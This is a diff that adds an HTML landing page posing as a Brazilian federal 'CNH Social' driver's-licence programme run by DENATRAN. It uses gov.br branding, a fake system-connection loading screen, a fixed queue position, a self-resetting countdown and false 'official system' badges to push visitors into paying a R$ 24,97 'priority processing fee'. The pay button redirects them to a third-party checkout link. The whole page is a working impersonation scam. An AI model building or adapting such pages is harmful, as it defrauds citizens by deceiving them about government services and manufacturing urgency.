@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <script>
+  window.googlePixelId = "694a28d20933edb83f74a17a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNH Social - Programa do Governo Federal | DENATRAN</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇧🇷</text></svg>">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #071d41 0%, #1351b4 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        #loading-screen.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .loading-logo {
+            width: 140px;
+            height: 140px;
+            background: white;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            animation: logoFloat 2s ease-in-out infinite;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            padding: 20px;
+        }
+        
+        .loading-logo img {
+            width: 100%;
+            height: auto;
+        }
+        
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        
+        .loading-bar-container {
+            width: 280px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .loading-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00cc6f);
+            border-radius: 10px;
+            animation: loadingProgress 3s ease-in-out forwards;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        .loading-percentage {
+            color: white;
+            font-size: 14px;
+            margin-top: 12px;
+            font-weight: 500;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        @keyframes loadingProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f5f6fa 0%, #e8eaf0 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, 
+                #009c3b 0%, 
+                #009c3b 33.33%, 
+                #ffdf00 33.33%, 
+                #ffdf00 66.66%, 
+                #002776 66.66%, 
+                #002776 100%
+            );
+            z-index: 1000;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08), 0 0 0 1px rgba(0, 0, 0, 0.05);
+            max-width: 520px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease forwards 0.3s;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .gov-header-top {
+            background: #071d41;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 3px solid #1351b4;
+        }
+        
+        .gov-logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .gov-logo img {
+            height: 32px;
+            width: auto;
+        }
+        
+        .gov-text {
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.2;
+        }
+        
+        .gov-text-small {
+            color: white;
+            font-size: 11px;
+            font-weight: 400;
+            opacity: 0.9;
+            margin-top: 2px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1351b4 0%, #0c326f 100%);
+            padding: 32px 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: headerGlow 8s ease-in-out infinite;
+        }
+        
+        @keyframes headerGlow {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-30px, -30px); }
+        }
+        
+        .program-badge {
+            background: rgba(255, 255, 255, 0.95);
+            color: #071d41;
+            padding: 10px 24px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            animation: badgeBounce 2s ease-in-out infinite;
+        }
+        
+        @keyframes badgeBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .header-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 900;
+            margin-bottom: 8px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            letter-spacing: -0.5px;
+        }
+        
+        .header-subtitle {
+            color: rgba(255, 255, 255, 0.95);
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .content {
+            padding: 32px 24px;
+        }
+        
+        .timer-box {
+            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 24px;
+            animation: timerPulse 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes timerPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(30, 58, 138, 0.7); }
+            50% { box-shadow: 0 0 0 10px rgba(30, 58, 138, 0); }
+        }
+        
+        .timer-text {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .timer-countdown {
+            font-size: 28px;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .status-card {
+            background: linear-gradient(135deg, #fff9e6 0%, #fffbf0 100%);
+            border: 2px solid #f59e0b;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            animation: slideInLeft 0.6s ease forwards;
+        }
+        
+        @keyframes slideInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .status-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #f59e0b 0%, #d97706 100%);
+        }
+        
+        .queue-label {
+            font-size: 13px;
+            color: #92400e;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+        
+        .queue-number-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+        
+        .queue-number {
+            font-size: 64px;
+            font-weight: 900;
+            color: #dc2626;
+            line-height: 1;
+            position: relative;
+            z-index: 2;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.1);
+            animation: numberPulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes numberPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        
+        
+        
+        @keyframes rotate {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .queue-text {
+            font-size: 15px;
+            color: #92400e;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+        
+        .progress-container {
+            margin-top: 16px;
+            background: rgba(251, 191, 36, 0.2);
+            height: 8px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #f59e0b, #d97706);
+            width: 15%;
+            border-radius: 10px;
+            animation: progressGrow 2s ease-in-out;
+            box-shadow: 0 0 10px rgba(245, 158, 11, 0.5);
+        }
+        
+        @keyframes progressGrow {
+            from { width: 0%; }
+            to { width: 15%; }
+        }
+        
+        .alert-box {
+            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
+            border-left: 4px solid #dc2626;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            animation: slideInRight 0.6s ease forwards 0.2s;
+            opacity: 0;
+        }
+        
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        
+        .alert-icon {
+            font-size: 28px;
+            animation: shake 0.5s ease-in-out infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-10deg); }
+            75% { transform: rotate(10deg); }
+        }
+        
+        .alert-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #991b1b;
+            text-transform: uppercase;
+        }
+        
+        .alert-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #7f1d1d;
+            font-weight: 500;
+        }
+        
+        .priority-card {
+            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
+            border: 3px solid #10b981;
+            border-radius: 12px;
+            padding: 28px 24px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+            animation: scaleIn 0.6s ease forwards 0.4s;
+            opacity: 0;
+        }
+        
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .priority-badge {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+            animation: badgeSlide 1s ease-in-out infinite;
+        }
+        
+        @keyframes badgeSlide {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(5px); }
+        }
+        
+        .priority-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #065f46;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+        
+        .benefits-list {
+            list-style: none;
+            margin-bottom: 24px;
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 0;
+            border-bottom: 1px solid #a7f3d0;
+            animation: fadeIn 0.5s ease forwards;
+            opacity: 0;
+        }
+        
+        .benefit-item:nth-child(1) { animation-delay: 0.5s; }
+        .benefit-item:nth-child(2) { animation-delay: 0.6s; }
+        .benefit-item:nth-child(3) { animation-delay: 0.7s; }
+        .benefit-item:nth-child(4) { animation-delay: 0.8s; }
+        .benefit-item:nth-child(5) { animation-delay: 0.9s; }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .benefit-item:last-child {
+            border-bottom: none;
+        }
+        
+        .benefit-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
+        }
+        
+        .benefit-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .benefit-text {
+            color: #047857;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        .price-section {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 24px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        
+        .price-label {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .price-amount {
+            font-size: 56px;
+            font-weight: 900;
+            color: #10b981;
+            line-height: 1;
+            margin-bottom: 8px;
+            animation: priceGlow 2s ease-in-out infinite;
+        }
+        
+        @keyframes priceGlow {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.2); }
+        }
+        
+        .price-installment {
+            font-size: 14px;
+            color: #6b7280;
+            font-weight: 600;
+        }
+        
+        .cta-button {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 20px 40px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            display: block;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 24px rgba(16, 185, 129, 0.4);
+            animation: buttonPulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes buttonPulse {
+            0%, 100% { 
+                box-shadow: 0 8px 24px rgba(16, 185, 129, 0.4);
+                transform: scale(1);
+            }
+            50% { 
+                box-shadow: 0 12px 32px rgba(16, 185, 129, 0.6);
+                transform: scale(1.02);
+            }
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+        
+        .cta-button:hover::before {
+            left: 100%;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 36px rgba(16, 185, 129, 0.5);
+        }
+        
+        .cta-button:active {
+            transform: translateY(-1px);
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .security-badge {
+            background: #f3f4f6;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 12px;
+            color: #4b5563;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 24px;
+            background: #f9fafb;
+            color: #6b7280;
+            font-size: 11px;
+            line-height: 1.7;
+            border-top: 1px solid #e5e7eb;
+        }
+        
+        .footer-line {
+            margin-bottom: 6px;
+        }
+        
+        .footer strong {
+            color: #1f2937;
+            font-weight: 700;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                border-radius: 8px;
+            }
+            
+            .queue-number {
+                font-size: 52px;
+            }
+            
+            .price-amount {
+                font-size: 44px;
+            }
+            
+            .content {
+                padding: 24px 20px;
+            }
+            
+            .header-title {
+                font-size: 24px;
+            }
+            
+            .gov-logo img {
+                height: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loading-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png" alt="Gov.br">
+        </div>
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Conectando ao Sistema DENATRAN</div>
+        <div class="loading-bar-container">
+            <div class="loading-bar"></div>
+        </div>
+        <div class="loading-percentage" id="loading-percentage">0%</div>
+    </div>
+
+    <div class="container">
+        <div class="gov-header-top">
+            <div class="gov-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png" alt="Gov.br">
+                <div>
+                    <div class="gov-text">Ministério da Infraestrutura</div>
+                    <div class="gov-text-small">Governo Federal</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="header">
+            <div class="program-badge">⭐ Programa Nacional</div>
+            <h1 class="header-title">CNH SOCIAL</h1>
+            <p class="header-subtitle">Departamento Nacional de Trânsito - DENATRAN</p>
+        </div>
+        
+        <div class="content">
+            <!-- Timer -->
+            <div class="timer-box">
+                <div class="timer-text">⏰ Oferta Exclusiva Expira em:</div>
+                <div class="timer-countdown" id="countdown">15:00</div>
+            </div>
+
+            <div class="status-card">
+                <div class="queue-label">📋 Sua Posição Atual na Fila</div>
+                <div class="queue-number-wrapper">
+                   
+                    <div class="queue-number">475º</div>
+                </div>
+                <p class="queue-text">Tempo estimado de espera: <strong>45 a 60 dias úteis</strong></p>
+                <div class="progress-container">
+                    <div class="progress-bar"></div>
+                </div>
+            </div>
+            
+            <div class="alert-box">
+                <div class="alert-header">
+                    <div class="alert-icon">⚠️</div>
+                    <div class="alert-title">Importante</div>
+                </div>
+                <p class="alert-text">
+                    Devido à alta demanda, o prazo de espera na fila regular está aumentando. 
+                    <strong>Cidadãos estão aguardando até 90 dias</strong> para serem atendidos. 
+                    Garanta seu atendimento prioritário antes que as vagas se esgotem!
+                </p>
+            </div>
+            
+            <div class="priority-card">
+                <div class="priority-badge">⚡ ATENDIMENTO PRIORITÁRIO</div>
+                <h2 class="priority-title">Seja Atendido em Até 2 Dias Úteis!</h2>
+                
+                <ul class="benefits-list">
+                    <li class="benefit-item">
+                        <div class="benefit-icon"></div>
+                        <span class="benefit-text">Atendimento garantido em até 48h úteis</span>
+                    </li>
+                    <li class="benefit-item">
+                        <div class="benefit-icon"></div>
+                        <span class="benefit-text">Agendamento prioritário no DETRAN</span>
+                    </li>
+                    <li class="benefit-item">
+                        <div class="benefit-icon"></div>
+                        <span class="benefit-text">Suporte exclusivo via WhatsApp</span>
+                    </li>
+                    <li class="benefit-item">
+                        <div class="benefit-icon"></div>
+                        <span class="benefit-text">Análise acelerada de documentos</span>
+                    </li>
+                    <li class="benefit-item">
+                        <div class="benefit-icon"></div>
+                        <span class="benefit-text">Garantia de processamento</span>
+                    </li>
+                </ul>
+                
+                <div class="price-section">
+                    <p class="price-label">🎯 Taxa de Processamento Prioritário</p>
+                    <div class="price-amount">R$ 24,97</div>
+                    <p class="price-installment">Pagamento único e seguro</p>
+                </div>
+                
+                <button class="cta-button" onclick="redirectToCheckout()">
+                    🚀 Garantir Atendimento Prioritário Agora
+                </button>
+
+                <div class="security-badges">
+                    <div class="security-badge">🔒 Pagamento Seguro</div>
+                    <div class="security-badge">✅ Sistema Oficial</div>
+                    <div class="security-badge">⚡ Ativação Imediata</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-line"><strong>Programa CNH Social - Governo Federal do Brasil</strong></div>
+            <div class="footer-line">Departamento Nacional de Trânsito - DENATRAN</div>
+            <div class="footer-line">Ministério da Infraestrutura</div>
+            <div class="footer-line" style="margin-top: 12px; padding-top: 12px; border-top: 1px solid #e5e7eb;">
+                Este serviço de processamento prioritário é oferecido para agilizar o atendimento aos cidadãos brasileiros.
+            </div>
+            <div class="footer-line">© 2025 - Todos os direitos reservados</div>
+        </div>
+    </div>
+
+    <script src="upsells.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        initUpsell(1);
+    });
+    </script>
+    
+    <script>
+        // Loading Screen
+        let percentage = 0;
+        const loadingScreen = document.getElementById('loading-screen');
+        const loadingPercentage = document.getElementById('loading-percentage');
+        
+        const loadingInterval = setInterval(() => {
+            percentage += Math.random() * 15;
+            if (percentage >= 100) {
+                percentage = 100;
+                clearInterval(loadingInterval);
+                setTimeout(() => {
+                    loadingScreen.classList.add('hide');
+                }, 500);
+            }
+            loadingPercentage.textContent = Math.floor(percentage) + '%';
+        }, 200);
+
+        // Countdown Timer
+        let timeLeft = 900; // 15 minutes in seconds
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                timeLeft = 900; // Reset
+            }
+        }
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        function redirectToCheckout() {
+            window.location.href = 'https://www.pay-pagamentos.link/checkout/0198bd00-e751-488a-a5da-414bf4ed0ca9';
+        }
+    </script>
+</body>
+</html>
